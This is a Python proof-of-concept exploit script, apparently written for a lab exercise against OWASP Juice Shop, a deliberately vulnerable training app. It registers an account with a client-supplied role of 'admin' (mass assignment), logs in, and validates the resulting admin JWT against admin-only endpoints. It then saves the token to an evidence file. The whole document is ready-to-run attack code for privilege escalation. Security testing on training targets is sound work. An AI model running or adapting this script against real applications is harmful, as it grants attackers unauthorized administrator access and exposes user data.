#!/usr/bin/env python3
"""
c07-admin-no-injection  --  Admin session WITHOUT SQL injection
Target: OWASP Juice Shop (http://host.docker.internal:3000)

Technique: MASS ASSIGNMENT on user registration (POST /api/Users).
The registration endpoint accepts a "role" field from the client and stores it
verbatim. Supplying {"role":"admin"} creates an account with the administrator
role. Logging in afterwards yields a legitimately RS256-signed JWT whose
payload contains "role":"admin" -> a real admin session token.

No SQL injection is used anywhere. Only:
  1. POST /api/Users  (registration with role=admin)
  2. POST /rest/user/login (normal credential login)

Outputs the admin JWT to /workspace/evidence/c7_no_sqli_token.txt
"""
import json, time, base64, sys, urllib.request, urllib.error, os

BASE = os.environ.get("TARGET", "http://host.docker.internal:3000")
OUT  = "/workspace/evidence/c7_no_sqli_token.txt"

def http(method, path, body=None, token=None):
    url = BASE + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    req.add_header("Accept", "application/json")
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            raw = r.read().decode()
            return r.status, raw
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

def jwt_payload(tok):
    p = tok.split(".")[1]
    p += "=" * (-len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p))

def main():
    stamp = str(int(time.time()))
    email = f"poc_admin_{stamp}@test.local"
    pw    = "Passw0rd!" + stamp

    print("[*] Target:", BASE)
    print("[*] 1) Register account WITH role=admin (mass assignment)")

    # --- control: normal customer registration (no role field) ---
    status, raw = http("POST", "/api/Users",
                       {"email": f"poc_cust_{stamp}@test.local",
                        "password": pw, "passwordRepeat": pw})
    print(f"    customer registration -> HTTP {status}")
    cust = json.loads(raw)["data"]
    print(f"    customer role = {cust.get('role')!r}")

    # --- exploit: mass assignment ---
    status, raw = http("POST", "/api/Users",
                       {"email": email, "password": pw, "passwordRepeat": pw,
                        "role": "admin"})
    print(f"    admin registration    -> HTTP {status}")
    if status != 201 and status != 200:
        print("    registration failed:", raw); sys.exit(1)
    admin = json.loads(raw)["data"]
    print(f"    created user id={admin.get('id')} role={admin.get('role')!r} "
          f"profileImage={admin.get('profileImage')!r}")
    assert admin.get("role") == "admin", "mass assignment did not take effect"

    print("[*] 2) Log in as the mass-assigned admin account")
    status, raw = http("POST", "/rest/user/login", {"email": email, "password": pw})
    print(f"    login -> HTTP {status}")
    login = json.loads(raw)
    token = login["authentication"]["token"]
    claims = jwt_payload(token)["data"]
    print(f"    JWT payload role   = {claims.get('role')!r}")
    print(f"    JWT payload email  = {claims.get('email')!r}")
    print(f"    JWT payload id     = {claims.get('id')!r}")
    assert claims.get("role") == "admin", "token is not an admin token"

    print("[*] 3) Validate token against admin-only endpoints")
    ok = False
    status, raw = http("GET", "/rest/admin/application-version", token=token)
    print(f"    GET /rest/admin/application-version -> HTTP {status} {raw[:120]}")
    if status == 200:
        ok = True

    status, raw = http("GET", "/api/Users", token=token)
    print(f"    GET /api/Users                      -> HTTP {status} (len {len(raw)})")
    if status == 200:
        ok = True

    # control: customer token must NOT reach admin endpoint
    status_c, raw_c = http("POST", "/rest/user/login",
                           {"email": f"poc_cust_{stamp}@test.local", "password": pw})
    ctoken = json.loads(raw_c)["authentication"]["token"]
    status_cc, raw_cc = http("GET", "/rest/admin/application-version", token=ctoken)
    print(f"    control: customer -> admin endpoint  -> HTTP {status_cc} "
          f"(expected 401/403)")

    if not ok:
        print("[-] admin endpoint access failed"); sys.exit(1)

    with open(OUT, "w") as f:
        f.write(token + "\n")
    print(f"[+] Admin session token written to {OUT}")
    print("[+] DONE")

if __name__ == "__main__":
    main()
